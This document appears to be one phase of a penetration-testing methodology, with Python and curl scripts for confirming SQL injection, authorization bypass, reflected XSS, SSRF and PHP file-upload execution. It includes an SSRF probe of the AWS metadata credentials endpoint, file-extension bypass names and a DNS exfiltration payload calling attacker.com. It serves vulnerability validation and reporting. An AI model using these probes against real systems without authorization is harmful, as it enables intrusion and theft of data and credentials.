# Phase 3: Validating Issues

Goal: Confirm vulnerability hypotheses with reproducible, evidence-backed proof. Isolate root cause and measure impact.

## Validation Framework

For each candidate from Phase 2:

1. **Define Expected Behavior** — What should happen?
2. **Establish Baseline** — Document normal behavior
3. **Execute Hypothesis** — Change one variable
4. **Compare Results** — Analyze deviation
5. **Document Evidence** — Capture proof
6. **Classify Finding** — Label as unverified/reproduced/isolated verified/suppressed

---

## Validation Patterns by Vulnerability Class

### Pattern 1: SQL Injection Validation

#### Step 1: Confirm Reachability

```bash
# Verify endpoint is reachable and returns 200
curl -s -w "\nStatus: %{http_code}\n" "https://target.com/api/users/1"
```

#### Step 2: Boolean-Based Confirmation

```bash
cat > validate_sqli.py << 'EOF'
import requests
import difflib

endpoint = "https://target.com/api/users"
param = "id"

# Baseline: Normal request
baseline = requests.get(f"{endpoint}?{param}=1").text
baseline_len = len(baseline)
print(f"[Baseline] Length: {baseline_len}")

# Test 1: AND 1=1 (true condition)
true_cond = requests.get(f"{endpoint}?{param}=1 AND 1=1").text
true_len = len(true_cond)
print(f"[True Condition] Length: {true_len}")

# Test 2: AND 1=2 (false condition)
false_cond = requests.get(f"{endpoint}?{param}=1 AND 1=2").text
false_len = len(false_cond)
print(f"[False Condition] Length: {false_len}")

# Analysis
if baseline_len == true_len and baseline_len != false_len:
    print("\n✓ CONFIRMED SQL INJECTION")
    print(f"  Baseline matches True condition: {baseline_len} chars")
    print(f"  False condition differs: {false_len} chars")
    print(f"  Delta: {abs(baseline_len - false_len)} bytes")
else:
    print("\n✗ INCONCLUSIVE: Lengths did not match expected pattern")

# Show sample delta
print("\n[Sample Response Diff]")
print(f"Baseline starts with: {baseline[:100]}")
print(f"True cond starts with: {true_cond[:100]}")
print(f"False cond starts with: {false_cond[:100]}")

EOF

python validate_sqli.py
```

#### Step 3: Error-Based Confirmation (if applicable)

```bash
# Trigger SQL syntax error
curl -s "https://target.com/api/users?id=1'" | grep -i "sql\|syntax\|database"

# Common error indicators
curl -s "https://target.com/api/users?id=1 UNION SELECT 1--" | \
  grep -iE "(error|exception|sql|syntax|mysql|postgres|database)"
```

#### Step 4: Classification

```
Status: REPRODUCED_FINDING
Severity: HIGH
Evidence:
  - Endpoint: /api/users?id=
  - Method: Boolean-based SQL injection
  - Proof: Response length differs between 1 AND 1=1 (245 bytes) vs 1 AND 1=2 (0 bytes)
  - Attacker Control: Yes (id parameter is user-supplied)
  - Impact: Data exfiltration possible
```

---

### Pattern 2: Authorization Bypass Validation

#### Step 1: Establish Baseline (Authorized User)

```bash
# User1 accessing their own resource
user1_token="Bearer token_user1"
curl -s -H "Authorization: $user1_token" "https://target.com/api/invoices/100" | jq .

# Record response and object owner
```

#### Step 2: Cross-User Access Test

```bash
# User1 attempting to access User2's resource
user2_invoice_id=200  # Known User2 invoice

curl -s -H "Authorization: $user1_token" "https://target.com/api/invoices/$user2_invoice_id" | jq .

# Compare responses
```

#### Step 3: Anonymous Access Test

```bash
# No authentication
curl -s "https://target.com/api/invoices/100" | jq .
```

#### Step 4: Classification

```bash
cat > validate_authz.py << 'EOF'
import requests

user1_auth = "Bearer token_user1"
user2_invoice_id = 200

# Authorized baseline
authorized = requests.get(
    "https://target.com/api/invoices/100",
    headers={"Authorization": user1_auth}
)

# Cross-user access
cross_user = requests.get(
    f"https://target.com/api/invoices/{user2_invoice_id}",
    headers={"Authorization": user1_auth}
)

# Anonymous access
anonymous = requests.get(
    "https://target.com/api/invoices/100"
)

print("=== AUTHORIZATION VALIDATION ===")
print(f"Authorized (own resource): {authorized.status_code}")
print(f"Cross-user access: {cross_user.status_code}")
print(f"Anonymous access: {anonymous.status_code}")

if cross_user.status_code == 200 and "sensitive_data" in cross_user.text:
    print("\n✓ CONFIRMED AUTHORIZATION BYPASS")
    print(f"  User1 accessed User2's invoice data")
    print(f"  Data leaked: {cross_user.json().get('customer_name')}")
elif cross_user.status_code == 403 and anonymous.status_code == 401:
    print("\n✓ AUTHORIZATION CORRECTLY ENFORCED")

EOF

python validate_authz.py
```

---

### Pattern 3: XSS Validation (Stored & Reflected)

#### Step 1: Identify Reflection Point

```bash
# Test reflected XSS
payload="xss_test_marker_<img src=x>"
curl -s "https://target.com/search?q=$payload" | grep -o "xss_test_marker_[^<]*"
```

#### Step 2: Confirm JavaScript Execution Environment

```bash
cat > validate_xss.py << 'EOF'
import requests
from playwright.async_api import async_playwright
import asyncio

async def validate_xss():
    payload = '<img src=x onerror="console.log(\'XSS_EXECUTED\')">'
    url = f'https://target.com/search?q={payload}'
    
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        page = await browser.new_page()
        
        # Capture console logs
        console_messages = []
        page.on("console", lambda msg: console_messages.append(msg.text))
        
        await page.goto(url)
        await page.wait_for_timeout(1000)  # Wait for JS execution
        
        # Check if our payload executed
        if any("XSS_EXECUTED" in msg for msg in console_messages):
            print("✓ CONFIRMED REFLECTED XSS (JavaScript Executed)")
            return True
        
        # Check page content for payload
        content = await page.content()
        if payload in content and '<img src=x onerror=' not in content.replace('onerror="', 'onerror='):
            print("✓ PAYLOAD PRESENT (May execute depending on context)")
            return True
        
        print("✗ NO EVIDENCE OF XSS EXECUTION")
        return False

asyncio.run(validate_xss())
EOF

python validate_xss.py
```

#### Step 3: Context Detection (JavaScript vs HTML Context)

```bash
# Check if payload is in <script> tag (higher impact)
curl -s "https://target.com/search?q=xss_test" | grep -o "<script>[^<]*xss_test[^<]*</script>"

# Check if payload is in HTML attributes (still dangerous)
curl -s "https://target.com/search?q=xss_test" | grep -o "=.*xss_test"
```

#### Step 4: Classification

```
Status: REPRODUCED_FINDING
Severity: HIGH
Type: Reflected XSS
Evidence:
  - URL: /search?q=<img src=x onerror="alert(1)">
  - Reflection: Unencoded in HTML body
  - Execution: Confirmed via Playwright (onerror event fires)
  - Impact: Session hijacking, credential theft possible
  - Prerequisites: User must click link (reflected XSS)
```

---

### Pattern 4: SSRF Validation

#### Step 1: Setup Detection Endpoint

```bash
# Using a RequestBin-like service or local listener
# Example: nc -l -p 9999

# Or use DNS exfiltration
payload='http://$(whoami).attacker.com/'
```

#### Step 2: Test Internal Access

```bash
cat > validate_ssrf.py << 'EOF'
import requests
import socket

def test_ssrf():
    # Test 1: AWS metadata endpoint
    payloads = {
        "aws_metadata": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "localhost_admin": "http://localhost:8080/admin",
        "internal_service": "http://internal-api.internal:3000/users",
    }
    
    for test_name, payload in payloads.items():
        try:
            resp = requests.get(
                f"https://target.com/api/proxy?url={payload}",
                timeout=5
            )
            
            # Check for internal content indicators
            if any(ind in resp.text for ind in ["metadata", "aws", "RoleArn", "secretKey"]):
                print(f"✓ CONFIRMED SSRF: {test_name}")
                print(f"   Response: {resp.text[:100]}")
                return True
        except requests.exceptions.Timeout:
            print(f"⚠️  TIMEOUT (possible SSRF interaction): {test_name}")
    
    return False

test_ssrf()
EOF

python validate_ssrf.py
```

---

### Pattern 5: File Upload Validation

#### Step 1: Confirm File Acceptance

```bash
# Upload a benign file with web shell extension
payload='<?php echo "UPLOAD_SUCCESS"; ?>'

curl -X POST \
  -F "file=@shell.php" \
  "https://target.com/api/upload" | jq .

# Check returned URL
```

#### Step 2: Confirm Execution

```bash
# If file is stored at /uploads/shell.php
curl -s "https://target.com/uploads/shell.php" | grep "UPLOAD_SUCCESS"

# If successful:
# ✓ CONFIRMED ARBITRARY FILE UPLOAD + RCE
```

#### Step 3: Extension Bypass Validation

```bash
cat > validate_upload.py << 'EOF'
import requests

test_files = [
    ("shell.php", "<?php echo 'RCE'; ?>", "application/octet-stream"),
    ("shell.php.jpg", "<?php echo 'RCE'; ?>", "image/jpeg"),
    ("shell.jpg.php", "<?php echo 'RCE'; ?>", "image/jpeg"),
    ("shell.php%00.jpg", "<?php echo 'RCE'; ?>", "image/jpeg"),
]

for filename, content, mimetype in test_files:
    files = {"file": (filename, content, mimetype)}
    resp = requests.post("https://target.com/api/upload", files=files)
    
    if resp.status_code == 200:
        print(f"✓ UPLOAD ACCEPTED: {filename}")
        # Try to execute
        file_url = resp.json().get("url")
        exec_resp = requests.get(file_url)
        if "RCE" in exec_resp.text:
            print(f"  ✓ EXECUTION CONFIRMED at {file_url}")

EOF

python validate_upload.py
```

---

## Evidence Collection Rules

### Safe Proof Standards

```markdown
### Access Control Finding

**Expected Behavior**: User1 should not access User2's private data
**Test**: Request /api/invoices/USER2_ID as User1
**Evidence**:
- Request: GET /api/invoices/5678 + Authorization: Bearer USER1_TOKEN
- Response: {"id": 5678, "amount": 5000, "customer": "John Doe"} (User2's data)
- Status: 200 (no auth error)

**Impact**: Unauthorized data disclosure affecting all users
**Severity**: HIGH (cross-user data leak)

---

### SQL Injection Finding

**Expected Behavior**: Response size consistent for valid ID values
**Test**: /api/users?id=1 vs /api/users?id=1 AND 1=2
**Evidence**:
- Baseline (id=1): 245 bytes, contains 8 user records
- AND 1=1 (id=1 AND 1=1): 245 bytes, same 8 records
- AND 1=2 (id=1 AND 1=2): 0 bytes, empty result

**Impact**: Attacker can extract all user data via UNION-based injection
**Severity**: CRITICAL (complete data exfiltration possible)
```

---

## Classification Labels

After validation, classify each finding:

| Label | Definition | Next Step |
|-------|-----------|-----------|
| **unverified_suspicion** | Pattern matched but no solid proof | Expand testing or deprioritize |
| **reproduced_finding** | Behavior confirmed, impact demonstrated | Include in report |
| **isolated_verified** | Root cause isolated, no false positive risk | Publish report |
| **suppressed** | Counterevidence found (e.g., exploitability blocked) | Exclude from report |
| **blocked** | Deployment/framework/middleware blocks the exact path | Exclude from report |

---

## Phase 3 Output

Generate a validation report:

```yaml
findings_validated:
  reproduced:
    - title: "SQL Injection in /api/users?id="
      severity: "CRITICAL"
      evidence: "Response length delta (245 vs 0 bytes)"
      impact: "Complete user database exfiltration"
      remediation: "Use parameterized queries"
    
    - title: "Authorization Bypass - Cross-User Access"
      severity: "HIGH"
      evidence: "User1 accessed User2 invoice (id=5678)"
      impact: "Unauthorized PII disclosure"
      remediation: "Implement resource ownership checks"
  
  suppressed:
    - title: "Potential XSS in search (HTML-encoded)"
      reason: "Payload was HTML-encoded in response body"
      evidence: "xss_test_<img src=x> became xss_test_&lt;img src=x&gt;"
  
  unable_to_confirm:
    - title: "SSRF to localhost:8080"
      reason: "Endpoint returned 404 (no service listening)"
      evidence: "Request succeeded but resource not found"

statistics:
  total_candidates: 5
  confirmed: 2
  suppressed: 1
  inconclusive: 2

decision_gate: "Ready for Phase 4 Reporting?"
```

---

## Decision: Phase 3 → Phase 4

**Continue if**:
- ✓ At least 1 confirmed finding (reproduced or isolated verified)
- ✓ Evidence is clear and repeatable
- ✓ Impact is documented

**Extend Phase 3 if**:
- ✗ No confirmed findings (expand hypothesis testing)
- ✗ Too many inconclusive results (refine validation methods)

**Next**: Move to `phase-4-reporting.md`
